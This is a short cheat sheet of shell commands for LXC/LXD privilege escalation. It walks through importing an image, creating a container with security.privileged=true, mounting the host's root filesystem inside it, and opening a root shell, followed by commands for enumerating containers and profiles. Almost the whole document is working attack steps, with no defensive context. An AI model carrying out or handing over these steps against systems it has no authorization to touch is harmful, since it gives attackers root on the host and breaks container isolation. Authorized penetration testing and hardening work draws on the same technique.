# LXC Privilege Escalation Techniques

## Check Group Membership

```bash
id
```

## List Images and Containers

```bash
lxc image list
lxc list
```

## Import an Image

```bash
lxc image import ubuntu-template.tar.xz --alias ubuntutemp
```

## Create a Privileged Container

```bash
lxc init ubuntutemp privesc -c security.privileged=true
```

## Mount Host Root Inside Container

```bash
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

## Start and Access Container

```bash
lxc start privesc
lxc exec privesc /bin/bash
ls -l /mnt/root
```

## Mount Host Root Into an Existing Container

```bash
lxc config device add <container_name> host-root disk source=/ path=/mnt/root recursive=true
lxc exec <container_name> /bin/bash
```

## Check if a Container is Privileged

```bash
lxc config show <container_name> | grep security.privileged
```

## List and Inspect LXD Profiles

```bash
lxc profile list
lxc profile show <profile_name>
```